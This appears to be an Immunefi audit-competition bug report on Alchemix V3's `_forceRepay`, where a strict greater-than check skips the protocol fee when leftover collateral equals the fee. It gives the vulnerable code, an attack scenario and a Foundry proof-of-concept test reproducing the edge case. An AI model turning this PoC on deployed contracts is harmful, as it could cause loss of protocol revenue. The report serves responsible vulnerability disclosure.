# 58718 sc medium in forcerepay protocol fee collection leads to theft of unclaimed yield

**Submitted on Nov 4th 2025 at 08:44:15 UTC by @legion for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58718
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The `_forceRepay` function in `AlchemistV3.sol` contains an off-by-one boundary condition error that causes protocol fees to be permanently lost when a borrower's remaining collateral **exactly equals** the protocol fee amount. The function uses a strict greater-than comparison (`>`) instead of greater-than-or-equal (`>=`) when deciding whether to collect the protocol fee, causing the fee transfer to be silently skipped in edge cases. This results in systematic theft of protocol-owned yield that should be collected as revenue during forced liquidation repayments.

## Vulnerability Details

### Root Cause

In `AlchemistV3.sol` at lines 771-775, the protocol fee collection logic contains a flawed boundary check:

```solidity
function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
    // ... repayment logic ...
    
    uint256 protocolFeeTotal = creditToYield * protocolFee / BPS;
    
    emit ForceRepay(accountId, amount, creditToYield, protocolFeeTotal);
    
    if (account.collateralBalance > protocolFeeTotal) {  //  BUG: Should be >=
        account.collateralBalance -= protocolFeeTotal;
        // Transfer the protocol fee to the protocol fee receiver
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal);
    }
    
    if (creditToYield > 0) {
        // Transfer the repaid tokens from the account to the transmuter.
        TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);
    }
    // ...
}
```

**The Problem:** The condition `account.collateralBalance > protocolFeeTotal` requires the remaining collateral to be **strictly greater** than the fee amount. When they are **exactly equal**, the condition evaluates to `false`, and the entire fee collection block is skipped.

### Attack Scenario

The vulnerability manifests during liquidations where:

1. A borrower's position has debt that is fully earmarked (e.g., after transmuter redemptions)
2. A liquidator calls `liquidate()`, which triggers `_forceRepay` to repay the earmarked debt
3. After the forced repayment transfer to the transmuter, the borrower's remaining collateral **exactly equals** the calculated protocol fee
4. Due to the strict `>` check, the protocol fee is never transferred to `protocolFeeReceiver`
5. The uncollected fee remains in the borrower's collateral balance indefinitely

This scenario occurs naturally without manipulation when:

* The borrower's initial collateral amount
* The amount force-repaid to the transmuter
* The protocol fee percentage

### Why This Is a Vulnerability

1. **Silent Failure**: The `ForceRepay` event emits `protocolFeeTotal` as if it were collected, but no actual transfer occurs
2. **Permanent Loss**: Once the liquidation completes, there's no mechanism to retroactively collect the missed fee

## Impact Details

### Direct Financial Loss

**Per-Incident Loss:**

* Each affected liquidation loses the **entire protocol fee** for that forced repayment
* With a 20% protocol fee (default configuration), this represents 20% of the repaid yield value
* Example: A 100 MYT forced repayment with exact boundary conditions results in 20 MYT lost revenue

## References

### Vulnerable Code

* **Primary Issue**: [`src/AlchemistV3.sol#L771-775`](file:///9276110/src/AlchemistV3.sol#L771-775) - Flawed boundary condition in `_forceRepay`
* **Entry Point**: [`src/AlchemistV3.sol#L583-632`](file:///9276110/src/AlchemistV3.sol#L583-632) - `liquidate()` function that calls `_forceRepay`

## Proof of Concept

## Proof of Concept

```solidity

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {AlchemistV3Test} from "./AlchemistV3.t.sol";
import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";

/// @notice PoC showing `_forceRepay` skips the protocol fee when the remaining
///         collateral equals the fee amount, due to a strict greater-than guard.
contract FixRegressionForceRepayProtocolFeePoC is AlchemistV3Test {
    function testForceRepaySkipsProtocolFeeOnExactCollateralMatch() external {
        // Configure fees so the leftover collateral after repayment should equal the protocol fee.
        vm.startPrank(alOwner);
        alchemist.setProtocolFee(2000); // 20%
        alchemist.setRepaymentFee(0);  // remove repayment fee noise
        alchemist.setMinimumCollateralization(1_200_000_000_000_000_000); // 1.20x
        alchemist.setGlobalMinimumCollateralization(1_200_000_000_000_000_000);
        alchemist.setCollateralizationLowerBound(1_200_000_000_000_000_000);
        vm.stopPrank();

        // Optional helper deposit keeps the system healthy.
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // Borrower deposits 60 MYT shares and borrows 50 debt tokens.
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), 60e18);
        alchemist.deposit(60e18, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 maxBorrowable = alchemist.getMaxBorrowable(tokenId);
        assertGe(maxBorrowable, 50e18, "insufficient borrowing capacity");
        alchemist.mint(tokenId, 50e18, address(0xbeef));
        vm.stopPrank();

        // Redeemer fully earmarks the borrower's debt so liquidation calls _forceRepay.
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 50e18);
        transmuterLogic.createRedemption(50e18);
        vm.stopPrank();

        vm.roll(block.number + 5_256_000);
        vm.prank(address(0xbeef));
        alchemist.poke(tokenId);

        // Record pre-liquidation metrics.
        (uint256 collateralBefore, uint256 debtBefore, uint256 earmarkedBefore) = alchemist.getCDP(tokenId);
        assertEq(debtBefore, earmarkedBefore, "debt should be fully earmarked");
        uint256 protocolFeeBalanceBefore = IERC20(address(vault)).balanceOf(alchemist.protocolFeeReceiver());

        // Liquidation should only execute _forceRepay since debt is fully earmarked.
        vm.startPrank(externalUser);
        (uint256 repaidYield, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);
        vm.stopPrank();

        assertEq(repaidYield, 50e18, "expected forced repayment amount");
        assertEq(feeInYield, 0, "repayment fee disabled for this PoC");
        assertEq(feeInUnderlying, 0, "no outsourced fee expected");

        // The protocol fee should have been `repaidYield * 20%`.
        uint256 expectedProtocolFee = repaidYield * alchemist.protocolFee() / 10_000;

        // Because of the strict `>` guard, the fee transfer never occurred.
        uint256 protocolFeeBalanceAfter = IERC20(address(vault)).balanceOf(alchemist.protocolFeeReceiver());
        assertEq(protocolFeeBalanceAfter, protocolFeeBalanceBefore, "protocol fee silently skipped");

        // Borrower's remaining collateral equals the unpaid protocol fee.
        (uint256 collateralAfter, uint256 debtAfter,) = alchemist.getCDP(tokenId);
        assertEq(debtAfter, 0, "debt fully repaid");
        assertEq(collateralBefore - collateralAfter, repaidYield, "forced repayment consumed expected collateral");
        assertEq(collateralAfter, expectedProtocolFee, "remaining collateral equals skipped fee");
    }
}
```
